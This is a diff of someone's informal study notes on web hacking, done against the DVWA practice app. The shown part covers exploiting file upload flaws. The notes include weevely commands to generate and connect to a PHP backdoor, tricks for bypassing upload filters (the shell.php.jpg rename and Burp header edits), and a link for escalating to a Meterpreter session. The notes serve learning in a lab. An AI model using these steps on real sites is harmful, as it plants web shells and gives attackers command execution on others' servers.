@@ -55,6 +55,12 @@ Ways to hack the website ->
     - Unlisted files, sub domains, directories
 
 #(02)- File Upload Vulnerabilities ->
+Screenshot(466)
+
+Step 1 -> Upload Normal Pic 
+Step 2 -> Traverse to the path given by the uploaded Pic as ../../path/path/pic.jpg remove it from the browser URL as
+	ip/dvwa/path/path/pic.jpg and u will be gone to the pic
+Step 3 -> Upload a PHP file
 
   Weevly -> It generates php shells and allow us to gain access on the target computer
    in terminal -> weevely generate 123456 /root/shell.php
@@ -63,21 +69,29 @@ Ways to hack the website ->
    // 4th is for the path where u want to put the file after generated
 
 If u r not able to upload the file then set the DVWA security as low or name the file as shell.php.jpg
-We can use burp suite also as we can change the files name back to php in headers and then forward the packet // this helps to bypass
-the file type filter
-If it is also checking the extension then change the file name as shell.php.jpg and we can use it in same way like weevly as ->
-weevely url_for_place_where_shell.php.jpg ur_password_for_file   // it will run in same way
 
-   To interact with the uploaded file cmds
+Upload the shell 
+
+Step 4 -> To interact with the uploaded file cmds
    weevely url_for_place_where_shell_file_is ur_password_for_file // after this u will be able to execute linux cmds
    cmd -> help // to know about the things u can do
-   cmds -> pwd or ls
+   cmds -> pwd or d
    cmd -> uname -a // to know the machine
-   cmd -> help // to see the options u can use with weevely
+   cmd -> system_info --help
+   cmd -> system_info -info php_Version // to see the options u can use with weevely
 
+This way we r connecting to the backdoor
+
+Note -> https://www.yeahhub.com/file-upload-exploitation-prevention-detailed-guide-2018/
+
+Step 5 -> 
+
+Note -> https://github.com/epinna/weevely3/wiki/Run-Meterpreter-Session
+Screenshot(467)
 Suppose u go to a page and u could see the URL as www.abc.com/dvwa/?page=include.php // here we can see ?page=include.php which means
 it is a GET request
-And the better way to deal with the POST requests we can use - BURP Proxy
+
+And the better way to deal with the POST requests we can use - BURP Proxy(Screenshot 468)
 In BURP what we r going to do that instead of sending the request directly to web server from the website we will send it first to
 proxy after starting burp go to options tab to check where is the proxy currently running, to use BURP we need to tell our browser to
 send all requests to burp proxy
@@ -86,7 +100,13 @@ In Burp go to the intercept tab, and now what ever the link is accessed on brows
 We can modify the packets also and Forward the data when we want until then the page would not be accessed on the browser
 Burp Suite here works like a client side proxy
 
-   ByPass Medium File Upload Security ->
+Step 6 -> 
+We can use burp suite also as we can change the files name back to php in headers and then forward the packet // this helps to bypass
+the file type filter
+If it is also checking the extension then change the file name as shell.php.jpg and we can use it in same way like weevly as ->
+weevely url_for_place_where_shell.php.jpg ur_password_for_file   // it will run in same way
+
+    ByPass Medium File Upload Security ->
    - change the name of the file extension from php to jpg
    - Intercept the packet and change the packet back from the jpg to php
 
